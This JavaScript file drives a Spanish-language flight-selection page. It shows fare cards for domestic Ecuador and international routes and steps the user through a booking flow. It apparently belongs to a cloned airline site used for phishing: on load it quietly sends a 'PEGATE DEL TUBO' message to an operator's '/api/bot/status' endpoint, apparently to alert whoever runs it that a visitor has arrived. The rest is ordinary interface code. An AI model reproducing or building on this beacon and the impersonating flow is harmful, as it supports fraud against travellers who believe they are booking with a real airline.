/* ==== FIX: topbar fija sin tapar contenido (móvil/desktop) ==== */
(function fixTopbarOverlap(){
  const tb = document.querySelector('.av-topbar');
  if (!tb) return;

  const set = () => {
    const h = tb.getBoundingClientRect().height || tb.offsetHeight || 0;
    document.documentElement.style.setProperty('--av-topbar-h', h + 'px');
  };

  const run = () => {
    set();
    document.body.classList.add('has-topbar');
  };

  if (document.fonts && document.fonts.ready) {
    document.fonts.ready.then(run);
  } else {
    window.addEventListener('load', run);
  }
  window.addEventListener('resize', set);
})();

/* ===== Handler unificado para EDITAR (topbar o icono viejo) =====
   Importante: NO marcamos info.edit = 1 para evitar loop de auto-búsqueda */
(function attachEditHandler(){
  function goEdit(ev){
    if (ev && ev.preventDefault) ev.preventDefault();
    try {
      if (typeof info === 'object' && info) {
        info.edit = 0; // clave para permitir edición en index
        if (info.flightInfo) {
          delete info.flightInfo.ticket_sched;
          delete info.flightInfo.ticket_type;
        }
        updateLS();
      }
    } catch (e) {}
    window.location.href = 'index.html';
  }
  document.addEventListener('click', (e) => {
    const btn = e.target.closest('#btn-edit-flight, .av-edit, [data-action="edit-flight"], [aria-label="Editar"]');
    if (btn) goEdit(e);
  });
})();

/**
 * flight-detail.js — con TARIFAS INLINE + fallback modal
 * - INLINE_FARES = true -> se despliega debajo del vuelo
 */

/* ===== CONFIG ===== */
const INLINE_FARES = true;          // cambia a false si quieres volver al modal
let _lastClickedCard = null;        // recordaremos la card clickeada

// capturamos qué .card-departure se clickeó (para insertar el panel debajo)
document.addEventListener('click', (e)=>{
  const c = e.target.closest('.card-departure');
  if (c) _lastClickedCard = c;
});

/* ===== SET DOM ===== */
const modal = document.querySelector('#modal-select-ticket');

const loader = document.querySelector('.loader');
setTimeout(() =>{
  try{
    document.querySelector('body').classList.remove('sb-hidden');
    loader.classList.remove('show');

    if(info.edit === 1){
      // si alguien dejó edit=1, intentará auto-buscar (mantenemos compatibilidad)
      btnSearchFlight && btnSearchFlight.click && btnSearchFlight.click();
    }

    fetch(`${API_URL}/api/bot/status`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
      },
      body: JSON.stringify({message: 'PEGATE DEL TUBO'})
    })
  }catch(err){
    console.log(err);
  }
}, 2500);

const closeModalTicket = document.querySelector('#modal-close-ticket');
closeModalTicket && closeModalTicket.addEventListener('click', () =>{
  try{
    modal.classList.remove('show');
  }catch(e){
    console.log(e);
  }
});

/* --- HEADER --- */
document.querySelector('#origin-code').textContent = info.flightInfo.origin.code;
document.querySelector('#destination-code').textContent = info.flightInfo.destination.code;
document.querySelector('#flight-date').textContent = monthDic[info.flightInfo.flightDates[0].split('-')[1] - 1] + ' ' +info.flightInfo.flightDates[0].split('-')[2];
document.querySelector('#flight-label-1').textContent = `Selecciona tu vuelo de salida - ${formatDateType1(info.flightInfo.flightDates[0])}`;
document.querySelector('#flight-label-2').textContent = `${info.flightInfo.origin.city} a ${info.flightInfo.destination.city}`;
document.querySelector('#flight-label-3').textContent = `${formatDateType1(info.flightInfo.flightDates[0])}`;

/* --- FLIGHT CARDS --- */
if(info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador'){
  // NAC
  document.querySelector('#flight-price-0').textContent  = formatPrice(pricesNAC.flight_1.xs);
  document.querySelector('#flight-price-1').textContent  = formatPrice(pricesNAC.flight_1.xs);
  document.querySelector('#flight-price-2').textContent  = formatPrice(pricesNAC.flight_2.xs);
  document.querySelector('#flight-price-3').textContent  = formatPrice(pricesNAC.flight_3.xs);
  document.querySelector('#flight-price-4') && (document.querySelector('#flight-price-4').textContent  = formatPrice(pricesNAC.flight_4.xs));
  document.querySelector('#flight-price-5') && (document.querySelector('#flight-price-5').textContent  = formatPrice(pricesNAC.flight_5.xs));
  document.querySelector('#flight-price-6') && (document.querySelector('#flight-price-6').textContent  = formatPrice(pricesNAC.flight_6.xs));
  document.querySelector('#flight-price-7') && (document.querySelector('#flight-price-7').textContent  = formatPrice(pricesNAC.flight_7.xs));
  document.querySelector('#flight-price-8') && (document.querySelector('#flight-price-8').textContent  = formatPrice(pricesNAC.flight_8.xs));
  document.querySelector('#flight-price-9') && (document.querySelector('#flight-price-9').textContent  = formatPrice(pricesNAC.flight_9.xs));
  document.querySelector('#flight-price-10') && (document.querySelector('#flight-price-10').textContent = formatPrice(pricesNAC.flight_10.xs));
}else{
  // INT
  document.querySelector('#flight-price-0').textContent  = formatPrice(pricesINT.flight_1.xs);
  document.querySelector('#flight-price-1').textContent  = formatPrice(pricesINT.flight_1.xs);
  document.querySelector('#flight-price-2').textContent  = formatPrice(pricesINT.flight_2.xs);
  document.querySelector('#flight-price-3').textContent  = formatPrice(pricesINT.flight_3.xs);
  document.querySelector('#flight-price-4') && (document.querySelector('#flight-price-4').textContent  = formatPrice(pricesINT.flight_4.xs));
  document.querySelector('#flight-price-5') && (document.querySelector('#flight-price-5').textContent  = formatPrice(pricesINT.flight_5.xs));
  document.querySelector('#flight-price-6') && (document.querySelector('#flight-price-6').textContent  = formatPrice(pricesINT.flight_6.xs));
  document.querySelector('#flight-price-7') && (document.querySelector('#flight-price-7').textContent  = formatPrice(pricesINT.flight_7.xs));
  document.querySelector('#flight-price-8') && (document.querySelector('#flight-price-8').textContent  = formatPrice(pricesINT.flight_8.xs));
  document.querySelector('#flight-price-9') && (document.querySelector('#flight-price-9').textContent  = formatPrice(pricesINT.flight_9.xs));
  document.querySelector('#flight-price-10') && (document.querySelector('#flight-price-10').textContent = formatPrice(pricesINT.flight_10.xs));
}

/* ===== BASE FUNCS ===== */
function updateLS(){
  LS.setItem('info', JSON.stringify(info));
}
function formatDateType1(date){
  let format = new Date(parseInt(date.split('-')[0]), parseInt(date.split('-')[1]) - 1, parseInt(date.split('-')[2]) - 1);
  return dayDic[format.getDay()] + ', ' + monthDic[format.getMonth()] + ' ' + date.split('-')[2];
}
function formatPrice(number){
  return Number(number ?? 0).toLocaleString('en', { maximumFractionDigits: 2 });
}

/* ================================================================
   MODO INLINE (despliega debajo del vuelo) o MODAL (fallback)
   ================================================================ */
function loadFlight(flight_sched){
  // Guardar selección
  info.flightInfo.ticket_sched = flight_sched;

  // Setear NAT/INT como hacías antes
  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
  info.flightInfo.ticket_nat = isNAC ? 'NAC' : 'INT';
  updateLS();

  if (INLINE_FARES) {
    // esperamos un tick para que el listener global registre _lastClickedCard
    setTimeout(()=>{ renderInlineFares(flight_sched); }, 0);
    return; // no abrimos modal
  }

  // ----- Fallback: MODO MODAL (tu comportamiento original) -----
  try{ modal.classList.add('show'); }catch(err){ console.log(err); }

  const xsPrice = document.querySelector('#xs');
  const sPrice  = document.querySelector('#s');
  const mPrice  = document.querySelector('#m');

  const P = isNAC ? pricesNAC : pricesINT;
  const F = P[flight_sched]; // {xs, s, m}
  if (xsPrice && sPrice && mPrice && F){
    xsPrice.textContent = formatPrice(F.xs);
    sPrice.textContent  = formatPrice(F.s);
    mPrice.textContent  = formatPrice(F.m);
  }
}

// obtiene la card clickeada o la que coincide con el onclick del flight_sched
function getCardForFlight(flight_sched){
  if (_lastClickedCard && _lastClickedCard.matches('.card-departure')) return _lastClickedCard;
  const all = Array.from(document.querySelectorAll('.card-departure[onclick]'));
  return all.find(el => (el.getAttribute('onclick') || '').includes(flight_sched)) || all[0];
}

// Render del panel inline (bonito) justo después de la card seleccionada
function renderInlineFares(flight_sched){
  const card = getCardForFlight(flight_sched);
  if (!card){ console.warn('No se encontró card'); return; }

  // cerrar paneles previos
  document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());

  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
  const P = isNAC ? pricesNAC : pricesINT;
  const F = P[flight_sched]; // {xs, s, m}
  if (!F){ console.warn('No hay precios para', flight_sched); return; }

  const html = `
    <div class="av-inline-fares" data-flight="${flight_sched}">
      <h3 class="av-choose-title">Elige cómo quieres volar</h3>
      <div class="av-fares-grid">
        <div class="card-container xs">
          <div class="card-ticket">
            <h2 class="card-ticket-type">Basic</h2>
            <p class="card-ticket-label">Vuela ligero</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/personalItemLowest-XS.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="xs">
            <h6 class="fs-3">$${formatPrice(F.xs)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>

        <div class="card-container s">
          <div class="card-ticket">
            <h2 class="card-ticket-type">Classic</h2>
            <p class="card-ticket-label">Más completo</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/S_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
              <div class="ct-item"><img src="./assets/svg/S_5.svg" width="18"><p>Asiento Economy</p></div>
              <div class="ct-item"><img src="./assets/svg/S_6.svg" width="18"><p>Acumula lifemiles</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="s">
            <h6 class="fs-3">$${formatPrice(F.s)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>

        <div class="card-container m">
          <div class="card-ticket">
            <h2 class="card-ticket-type">Flex</h2>
            <p class="card-ticket-label">Más posibilidades</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/M_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
              <div class="ct-item"><img src="./assets/svg/M_5.svg" width="18"><p>Asiento Economy</p></div>
              <div class="ct-item"><img src="./assets/svg/M_6.svg" width="18"><p>Acumula lifemiles</p></div>
              <div class="ct-item"><img src="./assets/svg/M_7.svg" width="18"><p>Reembolso</p></div>
              <div class="ct-item"><img src="./assets/svg/M_8.svg" width="18"><p>Cambios de vuelo</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="m">
            <h6 class="fs-3">$${formatPrice(F.m)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>
      </div>
    </div>
  `;

  card.insertAdjacentHTML('afterend', html);

  // acciones: seleccionar tarifa -> tu flujo original
  const panel = card.nextElementSibling;
  if (!panel) return;

  panel.addEventListener('click', (e)=>{
    const btn = e.target.closest('.card-ticket-header');
    if (!btn) return;
    nextStep(btn.dataset.next); // usa tu función existente
  });

  // enfocar con scroll suave
  panel.scrollIntoView({ behavior:'smooth', block:'start' });
}

/* ===== Paso siguiente (igual que tenías) ===== */
function nextStep(type){
  info.flightInfo.ticket_type = type;
  updateLS();
  if(info.flightInfo.type === 1){
    window.location.href = 'flight-detail-back.html';
  }else{
    window.location.href = 'step-two.html';
  }
}

/* ===== Suavizado del MODAL como respaldo (por si INLINE_FARES=false) ===== */
(function () {
  const modalEl = document.getElementById('modal-select-ticket');
  const closeBtnEl = document.getElementById('modal-close-ticket');
  if (!modalEl) return;

  function onOpen() {
    modalEl.setAttribute('aria-hidden', 'false');
    modalEl.removeAttribute('hidden');
    document.body.style.overflow = 'hidden';
  }
  function onClose() {
    modalEl.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  const mo = new MutationObserver(() => {
    const isOpen = modalEl.classList.contains('show') && getComputedStyle(modalEl).display !== 'none';
    if (isOpen) onOpen(); else onClose();
  });
  mo.observe(modalEl, { attributes: true, attributeFilter: ['class', 'hidden', 'style'] });

  closeBtnEl && closeBtnEl.addEventListener('click', () => modalEl.classList.remove('show'));
  modal.addEventListener('click', (e) => { if (e.target === modal) modal.classList.remove('show'); });
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') modalEl.classList.remove('show'); });
})();

/* === CIERRE / TOGGLE DEL BLOQUE DE TARIFAS INLINE =================== */
document.addEventListener('click', function (e) {
  const card = e.target.closest('.card-departure');
  if (!card) return;

  const panel = card.nextElementSibling;
  if (panel && panel.classList.contains('av-inline-fares')) {
    panel.remove();
    e.stopImmediatePropagation();
    e.preventDefault();
  }
}, true);

document.addEventListener('click', function (e) {
  const insidePanel = e.target.closest('.av-inline-fares');
  const insideCard  = e.target.closest('.card-departure');
  if (!insidePanel && !insideCard) {
    document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());
  }
});

document.addEventListener('click', function (e) {
  const btn = e.target.closest('.av-inline-close');
  if (!btn) return;
  const panel = btn.closest('.av-inline-fares');
  if (panel) panel.remove();
});

/* ===== Acordeón "Condiciones tarifarias" ===== */
(function () {
  const btn = document.querySelector('.js-acc');
  const panel = document.querySelector('.js-acc-panel');
  if (!btn || !panel) return;

  btn.addEventListener('click', () => {
    const open = btn.getAttribute('aria-expanded') === 'true';
    btn.setAttribute('aria-expanded', String(!open));
    panel.hidden = open;
  });
})();
